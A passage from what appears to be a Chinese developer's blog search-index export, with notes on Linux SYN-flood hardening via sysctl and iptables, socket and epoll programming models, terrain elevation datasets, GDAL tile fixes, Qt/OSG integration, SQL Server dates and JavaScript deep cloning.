-w net.ipv4.tcp_max_syn_backlog=2048# 打开SYN COOKIE功能：sysctl -w net.ipv4.tcp_syncookies=1# 降低重试次数：sysctl -w net.ipv4.tcp_synack_retries=3 sysctl -w net.ipv4.tcp_syn_retries=3 为了系统重启动时保持上述配置，可将上述命令加入到/etc/rc.d/rc.local文件中。 iptables阻止syn flood攻击防止同步包洪水（Sync Flood）: 12# –limit 1/s 限制syn并发数每秒1次，可以根据自己的需要修改iptables -A FORWARD -p tcp –syn -m limit –limit 1/s -j ACCEPT 防止各种端口扫描: 1iptables -A FORWARD -p tcp –tcp-flags SYN,ACK,FIN,RST RST -m limit –limit 1/s -j ACCEPT Ping洪水攻击（Ping of Death）: 1iptables -A FORWARD -p icmp –icmp-type echo-request -m limit –limit 1/s -j ACCEPT 屏蔽 SYN_RECV 的连接： 1iptables -A INPUT -p tcp -m tcp –tcp-flags SYN,RST,ACK SYN -m limit –limit 1/sec -j ACCEPT 禁止某IP访问： 1iptables -I INPUT -s xxx.xxx.xxx.xx -j DROP 参考链接 LINUX 服务器遭到SYN FLOOD攻击,by 晓风残梦. Linux netstat命令详解,by ggjucheng. netstat 的10个基本用法,by LCTT bazz2. netstat用法及TCP state解析,by vigarbuaa. Linux踢出其他正在SSH登陆用户,by 艾欧里亚. [Linux] killall 、kill 、pkill 命令详解,by 骑着蜗牛游世界. Linux中kill，pkill，killall和xkill命令汇总讲解,by simonGeek. Linux防止syn flood攻击，屏蔽 SYN_RECV 的连接,by Sphinx 中文站. iptables,by wangchujiang.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[不同语言的计时方法]]></title>
    <url>%2F2019%2F10%2F27%2F%E4%B8%8D%E5%90%8C%E8%AF%AD%E8%A8%80%E7%9A%84%E8%AE%A1%E6%97%B6%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[剖析代码性能时通常需要计时。下面记录不同语言的各种计时方法。 C++计时方法传统计时方法的代码如下： 1234567#include &lt;ctime&gt;using namespace std;clock_t start = clock();// do something...clock_t end = clock();cout &lt;&lt; &quot;花费了&quot; &lt;&lt; (double)(end - start) / CLOCKS_PER_SEC &lt;&lt; &quot;秒&quot; &lt;&lt; endl; C++11 标准的”最佳计时方法“的代码： 1234567891011#include &lt;chrono&gt; using namespace std;using namespace chrono;auto start = system_clock::now();// do something...auto end = system_clock::now();auto duration = duration_cast&lt;microseconds&gt;(end - start);cout &lt;&lt; &quot;花费了&quot; &lt;&lt; double(duration.count()) &lt;&lt; &quot;微秒&quot; &lt;&lt; endl; Python计时方法在Jupyter Notebook中，计时使用一个magic command：%timeit。 参考链接 C++11 新的计时方法——std::chrono 大法好,by sicolex.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++高性能网络编程]]></title>
    <url>%2F2019%2F10%2F26%2FCPlusPlus%E9%AB%98%E6%80%A7%E8%83%BD%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[最近需要用C++编写一个网络程序，因此将网络编程的相关知识整理学习一下。 Socket编程Socket 是对 TCP/IP 协议族的一种封装，是应用层与TCP/IP协议族通信的中间软件抽象层。从设计模式的角度看来，Socket其实就是一个门面模式，它把复杂的TCP/IP协议族隐藏在Socket接口后面，对用户来说，一组简单的接口就是全部，让Socket去组织数据，以符合指定的协议。 Socket 还可以认为是一种网络间不同计算机上的进程通信的一种方法，利用三元组（ip地址，协议，端口）就可以唯一标识网络中的进程，网络中的进程通信可以利用这个标志与其它进程进行交互。 Socket 起源于 Unix ，Unix/Linux 基本哲学之一就是“一切皆文件”，都可以用“打开(open) –&gt; 读写(write/read) –&gt; 关闭(close)”模式来进行操作。因此 Socket 也被处理为一种特殊的文件。 Socket类型创建 socket 的时候需要指定 socket 的类型，一般有三种： SOCK_STREAM：面向连接的稳定通信，底层是 TCP 协议，我们会一直使用这个。 SOCK_DGRAM：无连接的通信，底层是 UDP 协议，需要上层的协议来保证可靠性。 SOCK_RAW：更加灵活的数据控制，能让你指定 IP 头部 Socket编程接口 socket()：创建socket bind()：绑定socket到本地地址和端口，通常由服务端调用 listen()：TCP专用，开启监听模式 accept()：TCP专用，服务器等待客户端连接，一般是阻塞态 connect()：TCP专用，客户端主动连接服务器 send()：TCP专用，发送数据 recv()：TCP专用，接收数据 sendto()：UDP专用，发送数据到指定的IP地址和端口 recvfrom()：UDP专用，接收数据，返回数据远端的IP地址和端口 closesocket()：关闭socket Socket通信流程 图1 TCP通信流程 图2 UDP通信流程 字节序不同的计算机对数据的存储格式不一样，比如 32 位的整数 0x12345678，可以在内存里从高到低存储为 12-34-56-78 或者从低到高存储为 78-56-34-12。 但是这对于网络中的数据来说就带来了一个严重的问题，当机器从网络中收到 12-34-56-78 的数据时，它怎么知道这个数据到底是什么意思？ 解决的方案也比较简单，在传输数据之前和接受数据之后，必须调用 htonl/htons 或 ntohl/ntohs 先把数据转换成网络字节序或者把网络字节序转换为机器的字节序。 TCP 和 UDP 的端口是互不干扰的，也就是说系统可以同时开启 TCP 80 端口和 UDP 80 端口。 socket 不属于任何一层网络协议，它是对 TCP 层的封装，方便网络编程。 网络编程模型同步阻塞迭代模型同步阻塞迭代模型是最简单的一种IO模型，其核心代码如下： 123456789bind(srvfd);listen(srvfd);for(;;)&#123; clifd = accept(srvfd,...); //开始接受客户端来的连接 read(clifd,buf,...); //从客户端读取数据 dosomthingonbuf(buf); write(clifd,buf)//发送数据到客户端&#125; 上面的程序存在如下一些弊端： 如果没有客户端的连接请求，进程会阻塞在accept系统调用处，程序不能执行其他任何操作。(系统调用使得程序从用户态陷入内核态） 在与客户端建立好一条链路后，通过read系统调用从客户端接受数据，而客户端合适发送数据过来是不可控的。如果客户端迟迟不发生数据过来，则程序同样会阻塞在read调用，此时，如果另外的客户端来尝试连接时，都会失败。 同样的道理，write系统调用也会使得程序出现阻塞(例如：客户端接受数据异常缓慢，导致写缓冲区满，数据迟迟发送不出)。 多进程并发模型多进程并发模型在同步阻塞迭代模型的基础上进行了一些改进，以避免是程序阻塞在read系统调用上。核心代码如下： 123456789101112131415161718192021222324bind(srvfd);listen(srvfd);for(;;)&#123;clifd = accept(srvfd,...); //开始接受客户端来的连接ret = fork();switch( ret )&#123; case -1 : do_err_handler(); break; case 0: // 子进程 client_handler(clifd); break ; default : // 父进程 close(clifd); continue ;&#125;&#125;void client_handler(clifd)&#123; read(clifd,buf,...); //从客户端读取数据 dosomthingonbuf(buf); write(clifd,buf)//发送数据到客户端&#125; 上述程序在accept系统调用时，如果没有客户端来建立连接，会阻塞在accept处。一旦某个客户端连接建立起来，则立即开启一个新的进程来处理与这个客户的数据交互。避免程序阻塞在read调用，而影响其他客户端的连接。 多线程并发模型在多进程并发模型中，每一个客户端连接开启fork一个进程，若客户端连接较大，则系统依然将不堪负重。通过多线程(或线程池)并发模型，可以在一定程度上改善这一问题。 在服务端的线程模型实现方式一般有三种： 按需生成(来一个连接生成一个线程) 线程池(预先生成很多线程) Leader follower（LF） 以第一种为例，其核心代码如下： 12345678910111213141516171819void *thread_callback( void *args ) //线程回调函数&#123; int clifd = *(int *)args ; client_handler(clifd);&#125;void client_handler(clifd)&#123; read(clifd,buf,...); //从客户端读取数据 dosomthingonbuf(buf); write(clifd,buf)//发送数据到客户端&#125;bind(srvfd);listen(srvfd);for(;;)&#123; clifd = accept(); pthread_create(...,thread_callback,&amp;clifd);&#125; 服务端分为主线程和工作线程，主线程负责accept()连接，而工作线程负责处理业务逻辑和流的读取等。因此，即使在工作线程阻塞的情况下，也只是阻塞在线程范围内，对继续接受新的客户端连接不会有影响。 第二种实现方式，通过线程池的引入可以避免频繁的创建、销毁线程，能在很大程序上提升性能。 但多线程模型先天具有如下缺点： 稳定性相对较差。一个线程的崩溃会导致整个程序崩溃。 临界资源的访问控制，在加大程序复杂性的同时，锁机制的引入会是严重降低程序的性能。性能上可能会出现“辛辛苦苦好几年，一夜回到解放前”的情况。 IO多路复用模型多进程模型和多线程(线程池)模型每个进程/线程只能处理一路IO，在服务器并发数较高的情况下，过多的进程/线程会使得服务器性能下降。而通过多路IO复用，能使得一个进程同时处理多路IO，提升服务器吞吐量。这是一种进程预先告知内核的能力，让内核发现进程指定的一个或多个IO条件就绪了，就通知进程。使得一个进程能在一连串的事件上等待。 IO复用的实现方式目前主要有select、poll和epoll。 select和poll的原理基本相同： 注册待侦听的fd(这里的fd创建时最好使用非阻塞) 每次调用都去检查这些fd的状态，当有一个或者多个fd就绪的时候返回 返回结果中包括已就绪和未就绪的fd 相比select，poll解决了单个进程能够打开的文件描述符数量有限制这个问题：select受限于FD_SIZE的限制，如果修改则需要修改这个宏重新编译内核；而poll通过一个pollfd数组向内核传递需要关注的事件，避开了文件描述符数量限制。此外，select和poll共同具有的一个很大的缺点就是包含大量fd的数组被整体复制于用户态和内核态地址空间之间，开销会随着fd数量增多而线性增大。 epoll的出现，解决了select、poll的缺点： 基于事件驱动的方式，避免了每次都要把所有fd都扫描一遍。 epoll_wait只返回就绪的fd。 epoll使用nmap内存映射技术避免了内存复制的开销。 epoll的fd数量上限是操作系统的最大文件句柄数目,这个数目一般和内存有关，通常远大于1024。 总结： select：支持注册 FD_SETSIZE(1024) 个 socket。 poll： poll 作为 select 的替代者，最大的区别就是，poll 不再限制 socket 数量。 epoll：epoll 能直接返回具体的准备好的通道，时间复杂度 O(1)。 参考链接 C++网络框架和库,by 帝王铠. C++ 高性能服务器网络框架设计细节,by 范蠡. 值得推荐的C/C++框架和库 (真的很强大),by tibet889. 有哪些值得推荐的c/c++开源框架与库,by 零声学院. 有什么适合提高 C/C++ 网络编程能力的开源项目推荐？,by zhihu. 网络库libevent、libev、libuv对比,by 小麒麟666. libevent、libev、libuv、IOCP、asio、muduo优劣分析、QT下编译libevent静态库,by 雒珣. Reactor 模式简介,by lotabou. IO设计模式：Reactor和Proactor对比,by 大CC. Proactor和Reactor模型,by wiseAaron. 如何深刻理解reactor和proactor？,by zhihu. Libevent 编程指南,by senlin. 网络编程（三）：从libevent到事件通知机制,by auxten. 使用 libevent 和 libev 提高网络应用性能,by Martin C. Brown. 兄déi，libuv了解一下,by 宋光宇. Libuv 源码分析(2):源码一览,by Tubumu. IO设计模式：Actor、Reactor、Proactor,by _raindrop. Proactor网络编程模式歪解,by WUYU. 深入理解Reactor模式,by 独木の白帆. socket 编程基础知识,by cizixs. 一文读懂高性能网络编程中的I/O模型,by Jack Jiang. 几种典型的服务器网络编程模型归纳(select poll epoll),by DrStream. Linux IO模型和网络编程模型,by wade&amp;luffy. 开源免费的C/C++网络库(c/c++ sockets library) 七剑下天山,by 工程师WWW. c++ 网络编程（一）TCP/UDP windows/linux 下入门级socket通信 客户端与服务端交互代码,by aircraft.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[地形数据格式总结]]></title>
    <url>%2F2019%2F10%2F20%2F%E5%9C%B0%E5%BD%A2%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[地形数据是能够表示地球表面高低起伏状态的数据，即具有高程信息的数据。数字高程模型（DEM）是一种对空间起伏变化的连续表示方法，是一种特殊的 DatasetGrid 数据模型，每个网格的值为高程值，而且有标准的颜色表来表示，这对分幅 DEM 图像的合成很有帮助。 数字地面模型（digital terrain model，DTM）就是以数字的形式来表示实际地形特征的空间分布。有时所指的地形特征点仅指地面点的高程，就将这种数字地形描述称为数字高程模型（digital elevation model，DEM）。最初是于1958年由美国麻省理工学院Miller教授提出。数字地面模型广泛用于遥感，地理信息系统，大地测量和电子地图等领域。 常用的地形数据主要有：etopo、GTOPO30、GEBCO以及SRTM。按照精度从低到高排序如下： etopo5：GMT 网格数据之 etopo5 etopo2：GMT 网格数据之 ETOPO2v2 etopo1：GMT 网格数据之 ETOPO1 GEBCO：GEBCO：全球水深数据 GTOPO30：GMT 网格数据之 GTOPO30 SRTM30_PLUS：全球地形起伏数据：SRTM30_PLUS SRTM15_PLUS：全球地形起伏数据：SRTM15_PLUS SRTM3：高精度地形网格数据 SRTM ASTER GDEM：全球数字高程数据：ASTER GDEM 数据源 空间分辨率 覆盖范围 陆地/海洋 etopo5 5 弧分 全球 陆地 + 海洋 etopo2 2 弧分 全球 陆地 + 海洋 etopo1 1 弧分 全球 陆地 + 海洋 GEBCO 1 弧分 / 30 弧秒 全球 陆地 + 海洋 GTOPO30 30 弧秒 全球 陆地 SRTM30_PLUS 30 弧秒 (约 1km) 纬度 [-81,81] 陆地 + 海洋 SRTM15_PLUS 15 弧秒 (约 500m) 纬度 [-81,81] 陆地 + 海洋 SRTM 3 弧秒 (约 90m) 纬度 [-60,60] 陆地 ASTER GDEM 1 弧秒 (约 30m) 纬度 [-83,83] 陆地 ETOPOETOPO是一种地形高程数据。该数据由NGDC美国地球物理中心发布（U.S. National Geophysical Data Center ）。与srtm、aster gdem一样，均为高程数据，所不同的是它还包括海洋海底地形数据。 ETOPO地形数据有五种规格， ETOPO1的效果最好，ETOPO2、ETOPO5数据尽管可以使用，但目前已不推荐采用。其中ETOPO1约三百多兆的压缩包， ETOPO2约九十兆。 ETOPO1ETOPO1包含了全球地形和海洋深度，采样间隔为1弧分，是目前精度最高的global relief数据；其分为两个版本，Ice Surface和Bedrock，两个版本基本一致。不同之处在于在处理南极洲和Greenland地形时，前者给出的是加上冰盖层之后的高程，后者给出的是岩床的高程。 对于每个版本又细分为 grid-registered和cell-registered，其中grid-registered是权威版本，cell-registered是衍生版本，因而推荐下载使用grid-registered版本。 GEBCOGEBCO数据的全称是General Bathymetric Chart of the Oceans( 全球海洋通用水深数据) ，是由国际海道测量组织(IHO) 和政府间海洋学委员会(IOC) 联合发布的最全面的世界大洋海底地形数据，也是当今海洋模式中最常用的海洋水深数据之一。 SRTMSRTM 即航天飞机雷达地形测绘使命。航天地形测绘是指以人造地球卫星、宇宙飞船、航天飞机等航天器为工作平台，对地球表面所进行的遥感测量。以往的航天测绘由于其精度有限，一般只能制作中、小比例尺地图。SRTM则是美国太空总署（NASA）和国防部国家测绘局（NIMA）以及德国与意大利航天机构共同合作完成联合测量,由美国发射的“奋进”号航天飞机上搭载SRTM系统完成。本次测图任务从2000年2月11日开始至22日结束，共进行了11天总计222小时23分钟的数据采集工作，获取北纬60度至南纬56度之间总面积超过1.19亿平方公里的雷达影像数据，覆盖地球80%以上的陆地表面。 SRTM系统获取的雷达影像的数据量约9.8万亿字节，经过两年多的数据处理，制成了数字地形高程模型（DEM）。SRTM产品2003年开始公开发布，经历多修订，目前最新的版本为V4.1版本。 SRTM地形数据主要包含两类数据：SRTM3和SRTM1。 SRTM3精度为3弧秒，即90m一个点，包括非洲、北美、南美、欧亚、澳大利亚以及部分岛屿； SRTM1精度为1弧秒，即30m一个点，仅限美国地区； 所有的数据被分为1度1度的单元，共计上万个数据文件。文件名代表了该单元左下角的位置；不同网站下载的数据文件名不同，但文件名类似N37W105的 数据文件，其单元左下角的坐标为(37N,105W)；每个SRTM3数据文件包含了12011201个采样点；高程数据单位为m，参考水准面为 WGS84大地水准面模型；网格划分采用gridline registration方式，因而单元的南北边及左右边与相邻单元的边重合。 全国DEM 1km、500m和250m数据（SRTM 90m）中国海拔高度（DEM）空间分布数据来源于美国奋进号航天飞机的雷达地形测绘SRTM（Shuttle Radar Topography Mission，SRTM）数据。SRTM数据有现实性强、免费获取等优点，全球许多应用研究都采用SRTM数据开展环境分析。该数据集为基于最新的SRTM V4.1数据经重采样生成，包括1km、500m和250m三种精度的全国一张图数据。数据采用WGS84椭球投影。 hgt转tiff1gdal_translate -of GTiff N40E120.hgt N40E120.tif ASTER GDEMASTER GDEM，即先进星载热发射和反射辐射仪全球数字高程模型，与SRTM一样为数字高程DEM，其全球空间分辨率为30米。该数据是根据 NASA的新一代对地观测卫星Terra的详尽观测结果制作完成的。其数据覆盖范围为北纬83°到南纬83°之间的所有陆地区域，达到了地球陆地表面的99%。号称是“迄今最完整的全球地形数据”。 ASTER GDEM：空间分辨率：1弧度秒 （约30 米），精度：垂直精度20米，水平精度30米，SRTM数据的纬度覆盖范围是[-60,60]，ASTER GDEM数据的纬度覆盖范围为[-83,83]；SRTM的空间分辨率一般为90m，只有美国境内存在空间分辨率为30m的数据；ASTER GDEM的空间分辨率为30m； 参考链接 全国DEM 1km、500m和250m数据（SRTM 90m）,by 资源环境数据云平台. Digital_elevation_model,by wikipedia. GMT地形数据,by YF2015. 全球地形起伏数据总结,by SeisMan. Cesium卫星地图和高程数据切片经验总结,by jackhuang. 高精度地形网格数据 SRTM,by seisman. 工具gdal2srtmtiles的安装使用,by 四域公子. 地球椭球,by wikipedia. 椭球体的重要参数和公式,by cyqian.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GDAL处理地图栅格Tif黑边的方法]]></title>
    <url>%2F2019%2F10%2F20%2FGDAL%E5%A4%84%E7%90%86%E5%9C%B0%E5%9B%BE%E6%A0%85%E6%A0%BCTif%E9%BB%91%E8%BE%B9%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[通过地图下载软件LocaSpaceViewer下载卫星影像拼接成Tif文件后，会出现黑边问题。此外在Cesium中浏览瓦片地图会出现蓝色区域。下面即分析这两个问题出现的原因和解决方法。 下载方法LocaSpaceViewer中可选择行政区域下载卫星影像，这种方式拼接后的tif文件必然会出现黑边，如图1所示。 图1 黑边问题1 推荐在LocaSpaceViewer中以瓦片矩形区域下载卫星影像。具体方法为： 在该链接google-maps-coordinates-tile-bounds-projection处查询瓦片的经纬度。 在LocaSpaceViewer中绘制矩形，并将矩形顶点的经纬度设置为待下载瓦片的经纬度。 在LocaSpaceViewer下载指定瓦片。 该方法也可能会出现黑边，如图2所示。 图1 黑边问题2 此外，将tif文件转换成标准瓦片后，在Cesium中浏览瓦片地图会出现蓝色区域，如图3所示。 图3 蓝边问题 问题分析对问题1，下载不规则边界的地图时，地图下载软件不会自动填充白色或变成透明，所以导致黑边问题1的产生。 对问题2，产生原因目前不清楚，但因黑边的产生很有规则，所以解决方法会比较简单。 对问题3，产生原因是蓝边对应的瓦片不存在。 解决方法对问题1，可采用链接用LSV下载的高清地图去黑边教程指明的方法去除黑边，但使用如下命令： 1gdal2tiles.py &lt;image&gt; &lt;tilesdir&gt; 生成瓦片时会报错，因此建议采用瓦片矩形区域下载卫星影像，不要下载行政区域卫星地图。 对问题2，使用如下命令去除黑边： 1234// 查看tif文件元数据信息gdalinfo 10.tif// 根据黑边位置使用如下命令去除gdal_translate -srcwin 0 0 4096 4096 10.tif test.tif 对问题3，使用LocaSpaceViewer下载指定级别指定区域的卫星影像即可。 参考链接 Cesium卫星地图和高程数据切片经验总结,by jackhuang. 用LSV下载的高清地图去黑边教程,by LocaSpaceViewer.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Qt集成OSG开发]]></title>
    <url>%2F2019%2F10%2F13%2FQt%E9%9B%86%E6%88%90OSG%E5%BC%80%E5%8F%91%2F</url>
    <content type="text"><![CDATA[Qt集成OSG开发是指使用Qt开发图形用户界面，封装OSG为Qt的Widget，然后由OSG负责三维展示的解决方案。具体方法如下： QT+OSG开发环境配置具体配置过程请参考Windows下QT与OSG开发环境配置。 封装OSG为Widget封装OSG为Widget可参考osgQt。osgQt的编译链接与OSG类似。 osgQt仅将OSG封装成简单的Widget，还需研究将OSG封装成自定义控件，从而在QT Designer里方便使用。 参考链接 OSG嵌入QT的简明总结,by charlee44. OSG和Qt结合,by 先锋小牛. OSG中使用Qt做界面,by 很菜但努力. 第1课时《Qt osgEarth 编程入门》,by 汀兰左岸. QT pro文件解析, by 博弈right. Windows下QT与OSG开发环境配置,by jackhuang. window下查看dll, lib文件是32位还是64位,by 剑西楼. 使用VS工具查看dll是32位还是64位,by 代码运输员. Qt自定义控件的创建与初步使用（一）之自定义控件的创建步骤,by 穿过记忆的河流. Qt自定义控件的创建与初步使用（二）之图片上绘制文字、箭头、曲线,by 穿过记忆的河流. QT自定义控件(生成和使用),by jannn. QT学习笔记（5）：自定义控件,by xuzheng11332. QT自定义控件在QTCreator中不显示问题,by AleutianSix.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLServer2008中日期类型数据的存储]]></title>
    <url>%2F2019%2F10%2F13%2FSQLServer2008%E4%B8%AD%E6%97%A5%E6%9C%9F%E7%B1%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E7%9A%84%E5%AD%98%E5%82%A8%2F</url>
    <content type="text"><![CDATA[日期类型比较SQL Server 2008中有datetime、datetime2、datetimeoffset三种数据类型用于存储时间类型数据。它们之间的差别主要有： datetime、datetime2不存储时区信息，datetimeoffset存储时区信息。 datetime与datetime2区别是两者存储字节大小和精度不同，后者优于前者。 因此，在存储时间信息时，优先使用datetimeoffset数据类型。当使用datetime和datetime2数据类型时，因没有时区信息，很多客户端链接库会将存储的时间默认为UTC时间。例如： SQL Server2008中存储某人的出生日期为“1970-01-01 00:00:00”，通过sequelizejs框架读取得到出生日期将是“1970-01-01T00:00:00Z”，这里 T 仅仅是分隔日期和时间的符号，没有其他含义，而 Z 表示 UTC 时间。 这时需要根据自己所在时区对时间进行修正。最简单的方法是在SQL语句中进行修正，代码如下： 1select birthday1, dateadd(hour,-8,birthday) from students 日期转换有时时间会以字符串类型存储在数据库中，当需要对时间进行比较时，需要先将字符串类型时间转换成日期类型，可使用convert函数进行转换，例如： 1234# 字符串转日期select convert(date, &apos;2005-12-31 23:59:59.9999999&apos;)# 日期转字符串select convert(varchar, getdate(), 1) 其中date是要转换的数据的类型，’2005-12-31 23:59:59.9999999’是被转换的数据。 日期比较在mssql中比较两个日期的大小，可采用DATEDIFF函数，其语法如下： 1DATEDIFF ( datepart , startdate , enddate ) 其中，datepart是时间单位，startdate和enddate是合法的日期表达式。datediff用法示例如下： 1234567891011SELECT DATEDIFF(year, &apos;2005-12-31 23:59:59.9999999&apos;, &apos;2006-01-01 00:00:00.0000000&apos;);SELECT DATEDIFF(quarter, &apos;2005-12-31 23:59:59.9999999&apos;, &apos;2006-01-01 00:00:00.0000000&apos;);SELECT DATEDIFF(month, &apos;2005-12-31 23:59:59.9999999&apos;, &apos;2006-01-01 00:00:00.0000000&apos;);SELECT DATEDIFF(dayofyear, &apos;2005-12-31 23:59:59.9999999&apos;, &apos;2006-01-01 00:00:00.0000000&apos;);SELECT DATEDIFF(day, &apos;2005-12-31 23:59:59.9999999&apos;, &apos;2006-01-01 00:00:00.0000000&apos;);SELECT DATEDIFF(week, &apos;2005-12-31 23:59:59.9999999&apos;, &apos;2006-01-01 00:00:00.0000000&apos;);SELECT DATEDIFF(hour, &apos;2005-12-31 23:59:59.9999999&apos;, &apos;2006-01-01 00:00:00.0000000&apos;);SELECT DATEDIFF(minute, &apos;2005-12-31 23:59:59.9999999&apos;, &apos;2006-01-01 00:00:00.0000000&apos;);SELECT DATEDIFF(second, &apos;2005-12-31 23:59:59.9999999&apos;, &apos;2006-01-01 00:00:00.0000000&apos;);SELECT DATEDIFF(millisecond, &apos;2005-12-31 23:59:59.9999999&apos;, &apos;2006-01-01 00:00:00.0000000&apos;);SELECT DATEDIFF(microsecond, &apos;2005-12-31 23:59:59.9999999&apos;, &apos;2006-01-01 00:00:00.0000000&apos;); 参考链接 How to add hours to current date in SQL Server?,by stackoverflow. Choosing between DateTime, DateTimeOffset, TimeSpan, and TimeZoneInfo,by microsoft. datetime、datetime2的区别,by happymagic. DateTime , DateTime2 ,DateTimeOffset 之间的小区别,by 神崎橙. 关于“时间”的一次探索,by KohPoll. Date and Time Conversions Using SQL Server,by Edgewood Solutions. DATEDIFF (Transact-SQL),by microsoft.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript对象深度克隆]]></title>
    <url>%2F2019%2F10%2F10%2FJavaScript%E5%AF%B9%E8%B1%A1%E6%B7%B1%E5%BA%A6%E5%85%8B%E9%9A%86%2F</url>
    <content type="text"><![CDATA[JavaScript并没有提供对象的复制方法，只能借助第三方库或自己实现对象的深度克隆。具体方法如下： 第三方库实现实现JavaScript库的深度克隆的第三方库主要有： Underscore —— _.clone() jQuery —— $.clone() / $.extend() lodash —— .clone() / .cloneDeep() 借助 JSON 全局对象 Underscore —— _.clone()在 Underscore 中有这样一个方法：_.clone()，这个方法实际上是一种浅复制 (shallow-copy)，所有嵌套的对象和数组都是直接复制引用而并没有进行深复制。其代码如下： 12345// Create a (shallow-cloned) duplicate of an object._.clone = function(obj) &#123; if (!_.isObject(obj)) return obj; return _.isArray(obj) ? obj.slice() : _.extend(&#123;&#125;, obj);&#125;; jQuery —— $.clone() / $.extend()在 jQuery 中也有这么一个叫 $.clone() 的方法，可是它并不是用于一般的 JS 对象的深复制，而是用于 DOM 对象。与 Underscore 类似，可以通过 $.extend() 方法来完成深复制。值得庆幸的是，在 jQuery 中可以通过添加一个参数来实现递归extend。调用$.extend(true, {}, …)就可以实现深复制。 1234567891011var x = &#123; a: 1, b: &#123; f: &#123; g: 1 &#125; &#125;, c: [ 1, 2, 3 ]&#125;;var y = $.extend(&#123;&#125;, x), //shallow copy z = $.extend(true, &#123;&#125;, x); //deep copyy.b.f === x.b.f // truez.b.f === x.b.f // false lodash —— .clone() / .cloneDeep()在lodash中关于复制的方法有两个，分别是.clone()和.cloneDeep()。其中.clone(obj, true)等价于.cloneDeep(obj)。 借助 JSON 全局对象针对纯 JSON 数据对象的深复制，使用 JSON 全局对象的 parse 和 stringify 方法来实现深复制也算是一个简单讨巧的方法，但它能正确处理的对象只有 Number, String, Boolean, Array, 扁平对象，即那些能够被 json 直接表示的数据结构。 1234function jsonClone(obj) &#123; return JSON.parse(JSON.stringify(obj));&#125;var clone = jsonClone(&#123; a:1 &#125;); 递归实现下面是递归实现对象深度克隆的可用方法。 12345678910111213141516171819202122232425262728293031function clone(obj) &#123; // Handle the 3 simple types, and null or undefined if (null == obj || &quot;object&quot; != typeof obj) return obj; // Handle Date if (obj instanceof Date) &#123; var copy = new Date(); copy.setTime(obj.getTime()); return copy; &#125; // Handle Array if (obj instanceof Array) &#123; var copy = []; for (var i = 0, var len = obj.length; i &lt; len; ++i) &#123; copy[i] = clone(obj[i]); &#125; return copy; &#125; // Handle Object if (obj instanceof Object) &#123; var copy = &#123;&#125;; for (var attr in obj) &#123; if (obj.hasOwnProperty(attr)) copy[attr] = clone(obj[attr]); &#125; return copy; &#125; throw new Error(&quot;Unable to copy obj! Its type isn&apos;t supported.&quot;);&#125; 参考链接 深入剖析 JavaScript 的深复制,by 咀嚼之味. 深入理解JavaScript中的对象复制(Object Clone),by jingxian. JavaScript语言精粹（修订版）,by Douglas Crockford著.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[图片或多媒体大文件的存储与管理]]></title>
    <url>%2F2019%2F10%2F10%2F%E5%9B%BE%E7%89%87%E6%88%96%E5%A4%9A%E5%AA%92%E4%BD%93%E5%A4%A7%E6%96%87%E4%BB%B6%E7%9A%84%E5%AD%98%E5%82%A8%E4%B8%8E%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[图片、声音、视频等大文件在后台数据库中的存储管理方式通常有两种: 文件存储到数据库中 文件存储到文件系统中,数据库中保存文件路径 这两种文件存储管理方式有各自优缺点, 选择哪种方法存储大文件应根据具体情况而定。 文件系统存储管理方式文件系统存储管理方式将文件存储到磁盘中，在数据库中使用varchar类型记录文件路径。该方法的缺点主要有： 文件不支持DELETE 当删除文件路径时，不支持自动删除对应文件。 文件不支持事务隔离 如果改变文件内容或删除文件，这些操作将立刻被其他客户端看到。 文件不支持回滚 数据库记录能够恢复，但文件删除不能。 文件不支持数据库的备份工具 文件不支持SQL的访问权限设置 文件不是SQL数据类型 数据库不会验证文件路径是否有效。当文件移动、重命名、删除时，数据不会自动更新路径。 数据库中存储文件数据库通常支持BLOB类型，可用于存储任何二进制数据。数据库中存储文件，其优点对应文件系统管理存储方式的缺点。同样，数据库中存储文件也存在一些缺点： 对数据库的读/写的速度永远都赶不上文件系统处理的速度 数据库备份变的巨大，越来越耗时间 对文件的访问需要穿越你的应用层和数据库层 多媒体大文件存储建议当只涉及较小规模图片、音频的存储时，建议直接存放到数据库中。当涉及视频大文件存储时，建议还是用文件系统存储。 参考链接 SQL反模式,by Bill karwin著, 谭振林, Push Chen译. 特殊格式文件(视频、声音等) 在数据库中的存储方式,by Jesson. 关于图片或者文件在数据库的存储方式归纳,by 王滔. SQL Server 2008新特性——FILESTREAM,by 曾毅. oracle对大对象类型操作：blob，clob，nclob，bfile,by lxy2330. 类似优酷土豆视频网站的视频源文件一般是存储在什么样系统上？,by zhihu. How to add hours to current date in SQL Server?,by stackoverflow.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows下QT与OSG开发环境配置]]></title>
    <url>%2F2019%2F10%2F10%2FWindows%E4%B8%8BQT%E4%B8%8EOSG%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%2F</url>
